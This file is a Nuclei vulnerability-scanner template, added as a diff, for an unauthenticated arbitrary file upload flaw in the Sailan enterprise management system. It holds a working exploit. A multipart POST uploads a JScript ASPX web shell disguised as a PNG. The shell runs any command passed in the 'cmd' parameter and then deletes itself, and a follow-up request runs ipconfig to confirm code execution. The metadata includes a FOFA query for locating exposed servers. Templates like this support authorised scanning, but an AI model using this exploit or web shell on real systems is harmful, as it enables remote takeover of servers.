@@ -1,0 +1,65 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - (\/([^"]+\.aspx))
+          type: regex
+      raw:
+        - |
+          POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
+          Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+
+          -----------------------------142851345723692939351758052805
+          Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
+          Content-Type: image/png
+
+          <%@ Page Language="Jscript" validateRequest="false" %>
+          <%
+          var c=new System.Diagnostics.ProcessStartInfo("cmd");
+          var e=new System.Diagnostics.Process();
+          var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+          c.UseShellExecute=false;
+          c.RedirectStandardOutput=true;
+          c.RedirectStandardError=true;
+          e.StartInfo=c;
+          c.Arguments="/c " + Request.Item["cmd"];
+          e.Start();
+          out=e.StandardOutput;
+          EI=e.StandardError;
+          e.Close();
+          Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+          System.IO.File.Delete(Request.PhysicalPath);
+          Response.End();%>
+          -----------------------------142851345723692939351758052805--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Windows IP
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /{{uploadfile}}?cmd=ipconfig HTTP/1.1
+          Host: {{Hostname}}
+id: sailan-EHR_Holidays_SubmitUploadify-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/Home6/AdminPretty"
+        赛蓝企业管理系统 /EHRModule/EHR_Holidays/SubmitUploadify接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 赛蓝企业管理系统 /EHRModule/EHR_Holidays/SubmitUploadify 存在任意文件上传
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486172&idx=1&sn=2e1ab13ee912fc661b1d2f2b527ea7e6&chksm=c267bfeff51036f90786a1868cd231eeb03935c6134d574b91148aaa9b36f72d99e840960e85&token=1742030890&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Oce
+        - NOS
+        - 赛蓝企业管理系统
